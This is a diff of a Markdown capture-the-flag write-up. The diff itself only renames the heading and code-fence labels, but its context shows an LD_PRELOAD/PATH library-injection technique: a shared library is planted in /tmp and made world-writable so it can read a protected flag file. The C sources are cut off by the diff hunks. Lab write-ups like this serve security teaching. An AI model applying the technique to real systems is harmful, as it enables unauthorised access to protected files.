@@ -1,4 +1,4 @@
-# CTF4
+# CTF 4
 
 The main goal of this exploit was to, using environmental variables, be able to access a file that, other way, would have denied access. The main strategy here is to, instead of simply creating a script to read the file that has the flag, we create a library which is defined in the environmental variable $PATH. With that, we can capture the flag.
 
@@ -6,13 +6,13 @@ The main goal of this exploit was to, using environmental variables, be able to 
 
 The first step is to preload the future library in the list of environmental variables.
 
-```SHELL
+```sh
 echo 'LD_PRELOAD=/tmp/lib PATH=/tmp' > env 
 ```
 
 We will also create the file that will have the output in the tmp folder and give it all the permission.
 
-```SHELL
+```sh
 touch output.txt 
 chmod 777 output.txt 
 ```
@@ -21,7 +21,7 @@ chmod 777 output.txt
 
 The second step is to create the library itself (also in the tmp folder). This library is responsible for acessing the file and put the output (the flag) in another file (output.txt).
 
-```SHELL
+```sh
 cat > lib.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -39,7 +39,7 @@ This command will create a file lib.c that will access the file and print it to 
 
 Now, this file that we created have to be compiled as a library and give it all the permissions:
 
-```SHELL
+```sh
 gcc -fPIC -g -c lib.c 
 gcc -shared -o lib lib.o -lc
 chmod 777 lib
@@ -49,7 +49,7 @@ chmod 777 lib
 
 Now, with the library that have all the permissions, we need to execute it. For that, we need to create a c script that call this library and, with that, be able to get the flag.
 
-```SHELL
+```sh
 cat > exec.c
 #include <stdio.h>
 #include <stdlib.h>
